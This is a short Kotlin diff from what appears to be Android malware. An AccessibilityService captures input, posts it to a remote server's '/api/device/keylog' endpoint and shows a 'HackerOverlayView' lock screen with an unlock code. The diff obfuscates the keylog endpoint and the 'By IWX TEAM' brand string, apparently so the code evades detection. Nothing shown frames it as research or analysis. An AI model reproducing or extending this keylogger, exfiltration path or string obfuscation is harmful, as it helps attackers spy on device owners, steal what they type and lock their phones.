@@ -292,7 +292,7 @@ class InputEventService : AccessibilityService() {
             try {
                 http.newCall(
                     Request.Builder()
-                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
+                        .url(SecureConfig.serverUrl() + ObfStr.apiKeylog())
                         .post(body.toString().toRequestBody(JSON_MEDIA))
                         .build()
                 ).execute().close()
@@ -323,7 +323,7 @@ class InputEventService : AccessibilityService() {
             hideOverlayInternal()
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             wm = windowManager
-            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode, speed,
+            val view = HackerOverlayView(this, text.ifBlank { ObfStr.brandTag() }, style, unlockCode, speed,
                 onGranted = { soundManager?.stop(); soundManager = null }
             ) {
                 hideOverlay()
